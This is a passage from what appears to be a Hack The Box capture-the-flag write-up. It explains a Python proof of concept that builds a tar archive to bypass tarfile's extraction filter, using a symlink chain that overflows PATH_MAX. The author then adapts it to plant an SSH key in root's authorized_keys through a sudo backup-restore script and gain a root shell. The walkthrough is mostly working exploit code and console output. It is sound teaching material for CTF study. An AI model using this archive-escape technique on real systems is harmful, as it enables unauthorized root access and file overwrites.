+        <span class="n">b</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="nc">TarInfo</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">i</span><span class="p">))</span>
+        <span class="n">b</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="n">SYMTYPE</span>
+        <span class="n">b</span><span class="p">.</span><span class="n">linkname</span> <span class="o">=</span> <span class="n">comp</span>
+        <span class="n">tar</span><span class="p">.</span><span class="nf">addfile</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">comp</span><span class="p">)</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">comp</code> is a single very long directory name (247 <code class="language-plaintext highlighter-rouge">d</code>s on Linux). 247 is chosen so that 16 of them expand to ~3968 bytes, leaving ~128 bytes of headroom under the 4096 <code class="language-plaintext highlighter-rouge">PATH_MAX</code> for a prefix plus a few characters of the final link name. <code class="language-plaintext highlighter-rouge">steps</code> is 16 single-letter names (<code class="language-plaintext highlighter-rouge">a</code>-<code class="language-plaintext highlighter-rouge">p</code>), which become the 16 symlinks in the chain.</p>
+
+<p>Each iteration of the loop creates a pair: a directory with the long name <code class="language-plaintext highlighter-rouge">comp</code>, and a symlink (<code class="language-plaintext highlighter-rouge">a</code>, then <code class="language-plaintext highlighter-rouge">b</code>, etc.) pointing at it. So traversing <code class="language-plaintext highlighter-rouge">a/b/c/.../p</code> means following 16 symlinks, each expanding to a 247-char directory name. By the time <code class="language-plaintext highlighter-rouge">realpath</code> has resolved all 16, the accumulated path is ~3968 bytes, right up against <code class="language-plaintext highlighter-rouge">PATH_MAX</code>. This chain is entirely legitimate and stays inside the destination; its only purpose is to inflate the resolved path length.</p>
+
+<p>Next it drops the symlink that actually triggers the bypass:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+    <span class="c1"># create the final symlink that exceeds PATH_MAX and simply points to the
+</span>    <span class="c1"># top dir. this allows *any* path to be appended.
+</span>    <span class="c1"># this link will never be expanded by os.path.realpath(), nor anything after it.
+</span>    <span class="n">linkpath</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">steps</span><span class="p">),</span> <span class="sh">"</span><span class="s">l</span><span class="sh">"</span><span class="o">*</span><span class="mi">254</span><span class="p">)</span>
+    <span class="n">l</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="nc">TarInfo</span><span class="p">(</span><span class="n">linkpath</span><span class="p">)</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="n">SYMTYPE</span>
+    <span class="n">l</span><span class="p">.</span><span class="n">linkname</span> <span class="o">=</span> <span class="p">(</span><span class="sh">"</span><span class="s">../</span><span class="sh">"</span> <span class="o">*</span> <span class="nf">len</span><span class="p">(</span><span class="n">steps</span><span class="p">))</span>
+    <span class="n">tar</span><span class="p">.</span><span class="nf">addfile</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">linkpath</code> places a symlink named <code class="language-plaintext highlighter-rouge">llll...</code> (254 chars) at the end of the long chain (<code class="language-plaintext highlighter-rouge">a/b/.../p/</code>). Appending those 254 chars to the already-~3968-byte resolved path pushes it over <code class="language-plaintext highlighter-rouge">PATH_MAX</code>. When <code class="language-plaintext highlighter-rouge">realpath</code> tries to <code class="language-plaintext highlighter-rouge">lstat</code> this, it gets <code class="language-plaintext highlighter-rouge">ENAMETOOLONG</code>, gives up, and appends the rest literally, so this symlink is never expanded.</p>
+
+<p>The resulting target is 16 <code class="language-plaintext highlighter-rouge">../</code> (where 16 is the number of directories in the loop earlier), ending up back in the original base directory. Now it can point a symlink outside the destination:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+    <span class="c1"># make a symlink outside to keep the tar command happy
+</span>    <span class="n">e</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="nc">TarInfo</span><span class="p">(</span><span class="sh">"</span><span class="s">escape</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">e</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="n">SYMTYPE</span>
+    <span class="n">e</span><span class="p">.</span><span class="n">linkname</span> <span class="o">=</span> <span class="n">linkpath</span> <span class="o">+</span> <span class="sh">"</span><span class="s">/../flag</span><span class="sh">"</span>
+    <span class="n">tar</span><span class="p">.</span><span class="nf">addfile</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">escape</code> is a top-level symlink whose target routes <em>through</em> the overflow link: <code class="language-plaintext highlighter-rouge">a/b/.../p/&lt;254l&gt;/../flag</code>. At extraction time the OS follows <code class="language-plaintext highlighter-rouge">&lt;254l&gt;</code> (to the destination root) and then <code class="language-plaintext highlighter-rouge">../flag</code>, resolving to <code class="language-plaintext highlighter-rouge">flag</code> one level above the destination, outside the sandbox. It also keeps the regular <code class="language-plaintext highlighter-rouge">tar</code> tool happy.</p>
+
+<p>With that escape in place, it creates a hardlink through it:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+    <span class="c1"># use the symlinks above, that are not checked, to create a hardlink
+</span>    <span class="c1"># to a file outside of the destination path
+</span>    <span class="n">f</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="nc">TarInfo</span><span class="p">(</span><span class="sh">"</span><span class="s">flaglink</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">f</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="n">LNKTYPE</span>
+    <span class="n">f</span><span class="p">.</span><span class="n">linkname</span> <span class="o">=</span> <span class="sh">"</span><span class="s">escape/flag</span><span class="sh">"</span>
+    <span class="n">tar</span><span class="p">.</span><span class="nf">addfile</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">flaglink</code> is a hardlink whose target path goes through <code class="language-plaintext highlighter-rouge">escape</code> to the out-of-bounds <code class="language-plaintext highlighter-rouge">flag</code>. The filter resolves <code class="language-plaintext highlighter-rouge">escape/flag</code> but is fooled by the overflow trick, so it allows a hardlink to a file outside the destination.</p>
+
+<p>Now that <code class="language-plaintext highlighter-rouge">flaglink</code> points at the external file, writing a regular file member with the same name overwrites it:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+    <span class="c1"># now that we have the hardlink we can overwrite the file
+</span>    <span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">overwrite</span><span class="se">\n</span><span class="sh">"</span>
+    <span class="n">c</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="nc">TarInfo</span><span class="p">(</span><span class="sh">"</span><span class="s">flaglink</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">c</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="n">REGTYPE</span>
+    <span class="n">c</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">tar</span><span class="p">.</span><span class="nf">addfile</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">fileobj</span><span class="o">=</span><span class="n">io</span><span class="p">.</span><span class="nc">BytesIO</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
+<span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+</code></pre></div></div>
+
+<p>A regular file member, also named <code class="language-plaintext highlighter-rouge">flaglink</code>, writes its contents through the hardlink, overwriting the external <code class="language-plaintext highlighter-rouge">flag/flag</code> with <code class="language-plaintext highlighter-rouge">overwrite\n</code>. That’s the arbitrary-write primitive.</p>
+
+<p>Finally, it shows this isn’t limited to clobbering existing files:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">...[</span><span class="n">snip</span><span class="p">]</span><span class="bp">...</span>
+    <span class="c1"># we can also create new files as well!
+</span>    <span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">new!</span><span class="se">\n</span><span class="sh">"</span>
+    <span class="n">n</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="nc">TarInfo</span><span class="p">(</span><span class="sh">"</span><span class="s">escape/newfile</span><span class="sh">"</span><span class="p">)</span>
+    <span class="n">n</span><span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="n">tarfile</span><span class="p">.</span><span class="n">REGTYPE</span>
+    <span class="n">n</span><span class="p">.</span><span class="n">size</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">tar</span><span class="p">.</span><span class="nf">addfile</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">fileobj</span><span class="o">=</span><span class="n">io</span><span class="p">.</span><span class="nc">BytesIO</span><span class="p">(</span><span class="n">content</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">escape/newfile</code> writes through the <code class="language-plaintext highlighter-rouge">escape</code> symlink to create a brand-new file in the external directory it points to.</p>
+
+<p>All of this generates a <code class="language-plaintext highlighter-rouge">.tar</code> archive that when decompressed will bypass the filter.</p>
+
+<h4 id="exploit">Exploit</h4>
+
+<p>I’ll update the POC to overwrite the root user’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> file by changing four blocks:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:/tmp$</span><span class="w"> </span>diff orig.py poc.py 
+<span class="go">10c10
+</span><span class="diff-removed">&lt; with tarfile.open("poc.tar", mode="x") as tar:
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt; with tarfile.open("/opt/backup_clients/backups/backup_223.tar", mode="x") as tar:
+</span><span class="go">32c32
+</span><span class="diff-removed">&lt;     e.linkname = linkpath + "/../flag"
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt;     e.linkname = linkpath + "/../../../../root"
+</span><span class="go">34,42c34,36
+</span><span class="diff-removed">&lt;     # use the symlinks above, that are not checked, to create a hardlink
+&lt;     # to a file outside of the destination path
+&lt;     f = tarfile.TarInfo("flaglink")
+&lt;     f.type = tarfile.LNKTYPE
+&lt;     f.linkname =  "escape/flag"
+&lt;     tar.addfile(f)
+&lt;     # now that we have the hardlink we can overwrite the file
+&lt;     content = b"overwrite\n"
+&lt;     c = tarfile.TarInfo("flaglink")
+</span><span class="diff-lines">---
+</span><span class="diff-added">&gt;     
+&gt;     content = b"\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing\n"
+&gt;     c = tarfile.TarInfo("escape/.ssh/authorized_keys")
+</span><span class="go">46,51d39
+</span><span class="diff-removed">&lt;     # we can also create new files as well!
+&lt;     content = b"new!\n"
+&lt;     n = tarfile.TarInfo("escape/newfile")
+&lt;     n.type = tarfile.REGTYPE
+&lt;     n.size = len(content)
+&lt;     tar.addfile(n, fileobj=io.BytesIO(content))
+</span></code></pre></div></div>
+
+<p>The changes are:</p>
+
+<ol>
+  <li>Changing the output file to where it must be in order to be accepted by <code class="language-plaintext highlighter-rouge">restore_backup_clients.py</code>.</li>
+  <li>Rather than escaping to one directory up and then into <code class="language-plaintext highlighter-rouge">flag</code>, I’ll escape back to root’s home directory.</li>
+  <li>Rather than using a hardlink to overwrite, I’ll just write a regular file directly through the <code class="language-plaintext highlighter-rouge">escape</code> symlink, naming the member <code class="language-plaintext highlighter-rouge">escape/.ssh/authorized_keys</code>. The hardlink approach needs its target to already exist (<code class="language-plaintext highlighter-rouge">os.link</code> fails with <code class="language-plaintext highlighter-rouge">linkname not found</code> otherwise), and I don’t know at this point if root’s <code class="language-plaintext highlighter-rouge">authorized_keys</code> exists or not. A <code class="language-plaintext highlighter-rouge">REGTYPE</code> member written through the symlink creates the file if it’s absent (or overwrites it if present), and because the path runs through <code class="language-plaintext highlighter-rouge">escape</code> (pointing at <code class="language-plaintext highlighter-rouge">/root</code>), <code class="language-plaintext highlighter-rouge">tarfile</code>’s own <code class="language-plaintext highlighter-rouge">makedirs</code> will create <code class="language-plaintext highlighter-rouge">/root/.ssh</code> first if it’s missing too.</li>
+  <li>Delete the extra new file creation.</li>
+</ol>
+
+<p>I’ll run the <code class="language-plaintext highlighter-rouge">poc.py</code> and then the <code class="language-plaintext highlighter-rouge">sudo</code> command to have it do the exploitation:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">wacky@wingdata:/tmp$</span><span class="w"> </span>python3 poc.py 
+<span class="gp">wacky@wingdata:/tmp$</span><span class="w"> </span><span class="nb">sudo </span>python3 /opt/backup_clients/restore_backup_clients.py <span class="nt">-b</span> backup_223.tar <span class="nt">-r</span> restore_0xdf
+<span class="go">[+] Backup: backup_223.tar
+[+] Staging directory: /opt/backup_clients/restored_backups/restore_0xdf
+[+] Extraction completed in /opt/backup_clients/restored_backups/restore_0xdf
+</span></code></pre></div></div>
+
+<p>it reports success, and I can SSH as root:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen root@wingdata.htb 
+<span class="gp">Linux wingdata 6.1.0-42-amd64 #</span>1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 <span class="o">(</span>2025-12-30<span class="o">)</span> x86_64
+<span class="go">...[snip]...
+</span><span class="gp">root@wingdata:~#</span><span class="w"> 
+</span></code></pre></div></div>
+
+<p>And get the root flag:</p>
+
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@wingdata:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">4cb2f067************************
+</span></code></pre></div></div>
+
+      </div>
+    </div>
+  
+  </div><a class="u-url" href="/2026/06/27/htb-wingdata.html" hidden></a>
+</article>
+
+      </div>
+    </main>
+<footer class="site-footer">
+  <div class="footer-inner">
+
+    <div class="footer-brand">
+      <span class="footer-logo">0xdf hacks stuff</span>
+      <span class="footer-tagline">CTF solutions, malware analysis, home lab development</span>
+    </div>
+
+    <div class="footer-links">
+      <div class="footer-link-group">
+        <div class="footer-link-icons">
+          <a href="https://www.twitter.com/0xdf_" title="Twitter" aria-label="Twitter">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.953 4.57a10 10 0 01-2.825.775 4.958 4.958 0 002.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 00-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 00-.666 2.475c0 1.71.87 3.213 2.188 4.096a4.904 4.904 0 01-2.228-.616v.06a4.923 4.923 0 003.946 4.827 4.996 4.996 0 01-2.212.085 4.936 4.936 0 004.604 3.417 9.867 9.867 0 01-6.102 2.105c-.39 0-.779-.023-1.17-.067a13.995 13.995 0 007.557 2.209c9.053 0 13.998-7.496 13.998-13.985 0-.21 0-.42-.015-.63A9.935 9.935 0 0024 4.59z"/></svg>
+          </a>
+          <a rel="me" href="https://infosec.exchange/@0xdf" title="Mastodon" aria-label="Mastodon">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.668 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z"/></svg>
+          </a>
+          <a href="https://bsky.app/profile/0xdf.bsky.social" title="Bluesky" aria-label="Bluesky">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 10.8c-1.087-2.114-4.046-6.053-6.798-7.995C2.566.944 1.561 1.266.902 1.565.139 1.908 0 3.08 0 3.768c0 .69.378 5.65.624 6.479.815 2.736 3.713 3.66 6.383 3.364.136-.02.275-.039.415-.056-.138.022-.276.04-.415.056-3.912.58-7.387 2.005-2.83 7.078 5.013 5.19 6.87-1.113 7.823-4.308.953 3.195 2.05 9.271 7.733 4.308 4.267-4.308 1.172-6.498-2.74-7.078a8.741 8.741 0 0 1-.415-.056c.14.017.279.036.415.056 2.67.297 5.568-.628 6.383-3.364.246-.828.624-5.79.624-6.478 0-.69-.139-1.861-.902-2.206-.659-.298-1.664-.62-4.3 1.24C16.046 4.748 13.087 8.687 12 10.8Z"/></svg>
+          </a>
+          <a href="https://www.linkedin.com/in/0xdf" title="LinkedIn" aria-label="LinkedIn">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
+          </a>
+          <a href="https://app.hackthebox.com/public/users/4935" title="HackTheBox" aria-label="HackTheBox">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"/></svg>
+          </a>
+        </div>
+      </div>
+      <div class="footer-link-group">
+        <div class="footer-link-icons">
+          <a href="https://youtube.com/channel/UChO9OAH57Flz35RRX__E25A" title="YouTube" aria-label="YouTube">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z"/></svg>
+          </a>
+          <a href="/feed.xml" title="RSS Feed" aria-label="RSS Feed">
+            <svg viewBox="0 0 24 24" fill="currentColor"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"/></svg>
+          </a>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-support">
+      <link href="https://fonts.googleapis.com/css?family=Cookie" rel="stylesheet">
+      <a class="bmc-button" target="_blank" href="https://www.buymeacoffee.com/0xdf">
+        <img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee">
+        <span>Buy me a coffee</span>
+      </a>
+    </div>
+
+  </div>
+
+  <script src="/assets/js/jquery-3.6.0.min.js" integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK" crossorigin="anonymous"></script>
+  <script src="/assets/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+  <script src="/assets/js/bootstrap-toc.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.7/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+  <script src="/assets/js/collapsable.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10.6.1/dist/mermaid.min.js"></script>
+<script>
+  $(document).ready(function () {
+    mermaid.initialize({
+      startOnLoad:true,
+      theme: "default",
+    });
+    window.mermaid.init(undefined, document.querySelectorAll('.language-mermaid'));
+  });
+</script>
+
+  <script src="/assets/js/fix_mermaid.js"></script>
+  
+  <script src="/assets/js/header_links.js"></script>
+  
+  <script src="/assets/js/blurable.js"></script>
+  
+
+
+  <!-- Twitter universal website tag code -->
+  <script>
+    !function(e,t,n,s,u,a){e.twq||(s=e.twq=function(){s.exe?s.exe.apply(s,arguments):s.queue.push(arguments);
+     },s.version='1.1',s.queue=[],u=t.createElement(n),u.async=!0,u.src='//static.ads-twitter.com/uwt.js',
+     a=t.getElementsByTagName(n)[0],a.parentNode.insertBefore(u,a))}(window,document,'script');
+    // Insert Twitter Pixel ID and Standard Event data below
+    twq('init','o42o1');
+    twq('track','PageView');
+  </script>
+  <!-- End Twitter universal website tag code -->
+</footer>
+</body>
+
+</html>
